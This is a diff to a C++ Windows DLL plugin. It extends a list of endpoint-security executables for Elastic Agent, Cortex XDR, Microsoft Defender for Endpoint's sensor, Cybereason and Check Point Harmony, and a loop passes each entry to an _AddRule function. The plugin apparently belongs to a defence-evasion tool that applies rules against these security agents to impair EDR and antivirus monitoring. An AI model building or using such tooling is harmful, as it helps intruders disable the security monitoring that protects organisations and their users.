@@ -67,6 +67,18 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         L"%ProgramFiles%\\VIPRE\\SBAMSvc.exe",
         L"%ProgramFiles%\\Panda Security\\WaAgent\\WaAgent.exe",
         L"%ProgramFiles%\\McAfee\\Endpoint Security\\Threat Prevention\\mfemactl.exe",
+        // Elastic Security Agent
+        L"%ProgramFiles%\\Elastic\\Agent\\elastic-agent.exe",
+        // Cortex XDR (Palo Alto Networks / Traps)
+        L"%ProgramFiles%\\Palo Alto Networks\\Traps\\cyserver.exe",
+        L"%ProgramFiles%\\Palo Alto Networks\\Traps\\cys.exe",
+        // Microsoft Defender for Endpoint sensor (EDR — not AV)
+        L"%ProgramFiles%\\Windows Defender Advanced Threat Protection\\MsSense.exe",
+        // Cybereason
+        L"%ProgramFiles%\\Cybereason ActiveProbe\\Cybereason.exe",
+        L"%ProgramFiles%\\Cybereason ActiveProbe\\AmSvc.exe",
+        // Check Point Harmony Endpoint
+        L"%ProgramFiles%\\CheckPoint\\Endpoint Security\\EFR\\EFRService.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
